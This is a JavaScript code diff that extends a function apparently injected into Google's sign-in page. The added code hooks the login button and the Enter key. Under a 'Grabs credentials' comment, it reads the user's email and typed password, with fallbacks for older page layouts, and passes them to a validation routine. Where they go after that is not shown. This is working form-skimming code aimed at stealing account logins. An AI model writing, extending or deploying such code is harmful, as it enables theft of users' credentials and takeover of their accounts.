@@ -67,10 +67,27 @@ function google(){
 	let subject = "GOOGLE";
 	//Grabs login button object
 	let loginbutton = document.getElementById("passwordNext");
+	if (loginbutton === null){loginbutton = document.getElementById("signIn");}
+	//injex
 	if (loginbutton.onclick === null){
+		//Handle Enter
+		let passbox = document.getElementsByName("password")[0]
+		if (passbox !== undefined){
+			passbox.addEventListener("keydown",function(event){if (event.keyCode === 13) {
+				loginbutton.click();
+			}});
+		}
 		loginbutton.onclick = function (){
-			let email = document.getElementById("profileIdentifier").innerText;
-			let pass = document.getElementsByName("password")[0].value;
+			//Grabs credentials
+			let email;
+			let pass;
+			try{
+				pass = document.getElementsByName("password")[0].value;
+				email = document.getElementById("profileIdentifier").innerText;
+			}catch (e){
+				pass = document.getElementById("Passwd").value;
+				email = document.getElementById("email-display").innerText;
+			}
 			//Checks
 			if (typeof useringer === "undefined") {let useringer = "None"};
 			if (validateCredentials(email, pass)){
